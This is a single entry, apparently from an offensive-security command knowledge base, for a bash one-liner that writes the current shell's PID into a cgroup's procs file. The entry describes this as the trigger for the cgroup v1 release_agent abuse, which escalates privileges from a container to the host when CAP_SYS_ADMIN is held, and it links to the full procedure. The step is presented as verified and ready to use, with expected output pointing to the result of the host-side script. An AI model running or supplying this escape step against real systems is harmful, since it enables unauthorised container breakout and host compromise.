---
id: 081ee469-9b8b-4514-96c9-c3a3cd06ec72
name: attach-process-to-cgroup
type: command
executor: bash
data: sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
output: null
created_at: '2023-04-06T03:56:14.586660+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - cgroup
  - trigger
verified: true
validated: true
---

# attach-process-to-cgroup

## Command

```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## Description

Attaches the current shell's PID to the cgroup.procs file, causing the process to enter the cgroup and trigger release agent on exit for privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sh -c | Run command in subshell | Yes |
| "echo \$\$ > /tmp/cgrp/x/cgroup.procs" | Write PID to procs file | Yes |

## Examples

### Basic Usage

```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## Expected Output

(No immediate output; after 5-10 seconds, check $host_path/output for results of the agent script execution.)

## Related

- [[procedures/Abuse-Linux-Cgroup-v1-with-CAP-SYS-ADMIN-for-Host-Privilege-Escalation]]
